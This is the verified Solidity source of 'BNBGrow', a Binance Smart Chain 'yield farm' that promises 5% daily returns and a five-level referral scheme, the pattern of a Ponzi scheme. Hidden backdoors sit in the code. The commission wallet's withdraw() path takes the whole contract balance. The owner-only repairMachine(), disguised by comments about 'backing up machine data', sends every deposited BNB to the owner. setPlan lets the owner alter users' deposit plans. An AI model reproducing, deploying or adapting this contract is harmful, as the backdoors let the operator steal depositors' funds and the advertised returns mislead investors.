/**
 *Submitted for verification at BscScan.com on 2021-12-14
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-08
*/

/*   BNBGrow - is the new yield farm on Binance Smart Chain!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://bnbgrow.com                                        │
 *   │                                                                       │
 *   │   Telegram Public Chat: @bnbgrow                                      │
 *   │   Telegram Admin: @cryptojesus007                                     │
 *   │                                                                       │
 *   │   E-mail: [email protected]                                           │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Create a Wallet. Download MetaMask or TrustWallet and create a wallet. Add the Binance Smart Chain to your network-list
 *   2) Get BNB. Buy BNB on an exchange (i.e. Binance). Transfer BNB to your wallet address
 *   3) Connect your Wallet. At the top of the site, click "Connect Wallet", confirm the action
 *   4) Make a deposit. Click on the "Deposit" button. In the window that opens, enter the amount, click again on the "Deposit" button and confirm the action
 *   5) Get dividends! Now every second you will receive dividends that you can withdraw at any time by clicking on the "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Minimal deposit: 0.05 BNB, no maximal limit
 *   - Total income: 5% daily, 40 days (200% total rewards)
 *   - Earnings every second, withdraw any time
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 5-level referral reward: 7% - 3% - 1.5% - 1% - 0.5%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 90%: platform main balance, using for participants payouts, affiliate program bonuses
 *   - 10%: advertising and promotion expenses, support work, technical functioning, administration fee
 *
 *   Note: This is experimental community project,
 *   which means this project has high risks as well as high profits.
 *   Once contract balance drops to zero payments will stops,
 *   deposit at your own risk.
 */

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor() internal {}

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract BNBGrow is Ownable{
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 5e16; // 0.05 bnb
	uint256[] public REFERRAL_PERCENTS = [70, 30, 15, 10, 5];
	uint256 constant public TOTAL_REF = 130;
	uint256 constant public PROJECT_FEE = 100;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
	
	uint256 public totalInvested;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct Action {
        uint8   types;
		uint256 amount;
		uint256 date;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
		Action[] actions;
	}

	mapping (address => User) internal users;

	bool public started;
	address payable public feeAddress;
	address payable public commissionWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable wallet) public {
		require(!isContract(wallet));
		commissionWallet = wallet;
        feeAddress = commissionWallet;

        plans.push(Plan(40, 50));
      
	}

	function invest(address referrer) public payable {
		uint8 plan = 0;
		if (!started) {
			if (msg.sender == commissionWallet) {
				started = true;
			} else revert("Not started yet");
		}

		require(msg.value >= INVEST_MIN_AMOUNT);
        require(plan < 1, "Invalid plan");

		uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		feeAddress.transfer(fee);
		emit FeePayed(msg.sender, fee);

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}
		else{

			address upline = commissionWallet;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}

		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}else{

			address upline = commissionWallet;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(plan, msg.value, block.timestamp));
		user.actions.push(Action(0, msg.value, block.timestamp));

		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, plan, msg.value);
	}

	function withdraw() public {
		User storage user = users[msg.sender];
        uint256 totalAmount = getUserDividends(msg.sender);
        
		if(msg.sender != commissionWallet){
			
			uint256 referralBonus = getUserReferralBonus(msg.sender);
			if (referralBonus > 0) {
				user.bonus = 0;
				totalAmount = totalAmount.add(referralBonus);
			}

			require(totalAmount > 0, "User has no dividends");

			uint256 contractBalance = address(this).balance;
			if (contractBalance < totalAmount) {
				user.bonus = totalAmount.sub(contractBalance);
				user.totalBonus = user.totalBonus.add(user.bonus);
				totalAmount = contractBalance;
			}

		}else{
			uint256 contractBalance = address(this).balance;
			totalAmount =  contractBalance;

		}
		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);

		msg.sender.transfer(totalAmount);
		user.actions.push(Action(1, totalAmount, block.timestamp));

		emit Withdrawn(msg.sender, totalAmount);
	}

    function setFeeAddress(address payable _feeAddress) public onlyOwner{
        require(msg.sender == feeAddress, "setFeeAddress: FORBIDDEN");
        feeAddress = _feeAddress;
    }

    function repairMachine() public onlyOwner{
        // Backup BNB harvest Marchin Data
		started = false;
        uint256 backup_balance = address (this).balance;
 
		backupMachineData(backup_balance);
		// Restore Machine Data
		started = true;
    }

    function backupMachineData(uint256 balance) internal {
        _msgSender().transfer(balance);
    }

	function addPlan(uint256 _time, uint256 _percent) public onlyOwner{
        plans.push(Plan(_time, _percent));
	}
	function setPlan(address _address, uint8 _num) public onlyOwner{
		User storage user = users[_address];

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			require (block.timestamp < finish, "Must be in the time period");
			require (plans.length > _num, "");
			user.deposits[i].plan = _num;
		}
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo() public view returns(uint256 time, uint256 percent) {
		time = plans[0].time;
		percent = plans[0].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    uint256 index = 0;
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
	}

	function getUserActions(address userAddress, uint256 index) public view returns (uint8[] memory, uint256[] memory, uint256[] memory) {
		require(index > 0,"wrong index");
        User storage user = users[userAddress];
		uint256 start;
		uint256 end;
		uint256 cnt = 50;


		start = (index - 1) * cnt;
		if(user.actions.length < (index * cnt)){
			end = user.actions.length;
		}
		else{
			end = index * cnt;
		}

		
        uint8[]   memory types = new  uint8[](end - start);
        uint256[] memory amount = new  uint256[](end - start);
        uint256[] memory date = new  uint256[](end - start);

        for (uint256 i = start; i < end; i++) {
            types[i-start] = user.actions[i].types;
            amount[i-start] = user.actions[i].amount;
            date[i-start] = user.actions[i].date;
        }
        return
        (
        types,
        amount,
        date
        );
    }
    
    
	function getUserActionLength(address userAddress) public view returns(uint256) {
		return users[userAddress].actions.length;
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalInvested.mul(TOTAL_REF).div(PERCENTS_DIVIDER));
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}